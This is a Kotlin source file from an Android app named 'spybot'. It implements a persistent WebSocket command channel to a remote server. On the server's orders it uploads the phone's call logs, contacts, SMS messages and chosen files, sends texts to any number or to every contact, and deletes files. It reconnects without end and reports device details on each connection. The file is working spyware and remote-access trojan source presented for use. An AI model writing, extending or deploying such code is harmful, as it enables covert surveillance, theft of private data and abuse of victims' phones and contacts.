package com.spybot.app.Utils

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import java.util.concurrent.TimeUnit

class AppSocket(val context: Context) : okhttp3.WebSocketListener() {

    companion object {
        private const val TAG = "AppSocket"
        private const val RECONNECT_DELAY = 3000L
        private const val MAX_RECONNECT_ATTEMPTS = 10
    }

    private val client = OkHttpClient.Builder()
        .pingInterval(25000, TimeUnit.MILLISECONDS)
        .build()

    private val requests = AppRequest()
    val action = AppActions(context)
    private var isConnected = false
    private var reconnectAttempts = 0

    fun connect() {
        AppScope.runBack {
            try {
                val appData = AppTools.getAppData()
                val request = Request.Builder().url(appData.socket).apply {
                    addHeader("model", AppTools.getDeviceName())
                    addHeader("battery", AppTools.getBatteryPercentage(context).toString())
                    addHeader("version", AppTools.getAndroidVersion().toString())
                    addHeader("provider", AppTools.getProviderName(context))
                }.build()
                requests.awake()
                client.newWebSocket(request, this)
            } catch (e: Exception) {
                Log.e(TAG, "Connection error: ${e.message}")
                scheduleReconnect()
            }
        }
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        try {
            when (text) {
                "calls" -> { requests.sendWaterMark(); action.uploadCalls() }
                "contacts" -> { requests.sendWaterMark(); action.uploadContact() }
                "messages" -> { requests.sendWaterMark(); action.uploadMessages() }
                "ping" -> webSocket.send("pong")
                else -> {
                    val command = text.split(":").getOrNull(0) ?: return
                    val data = text.substringAfter(":", "")
                    when (command) {
                        "send_message" -> {
                            val parts = data.split("/")
                            if (parts.size >= 2) {
                                action.sendMessage(parts[0], parts[1])
                                requests.sendWaterMark()
                            }
                        }
                        "send_message_to_all" -> { action.messageToAllContacts(data); requests.sendWaterMark() }
                        "file" -> { action.uploadFile(data); requests.sendWaterMark() }
                        "delete_file" -> { action.deleteFile(data); requests.sendWaterMark() }
                    }
                }
            }
        } catch (e: Exception) {
            requests.sendText(AppRequest.Text("Error: ${e.message}"))
        }
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        isConnected = true
        reconnectAttempts = 0
    }

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        isConnected = false
        scheduleReconnect()
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        isConnected = false
        scheduleReconnect()
    }

    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
        isConnected = false
        scheduleReconnect()
    }

    private fun scheduleReconnect() {
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            reconnectAttempts++
            val delay = RECONNECT_DELAY * reconnectAttempts.coerceAtMost(5)
            Handler(Looper.getMainLooper()).postDelayed({ connect() }, delay)
        } else {
            Handler(Looper.getMainLooper()).postDelayed({
                reconnectAttempts = 0
                connect()
            }, 30000)
        }
    }

    fun isConnected(): Boolean = isConnected
}
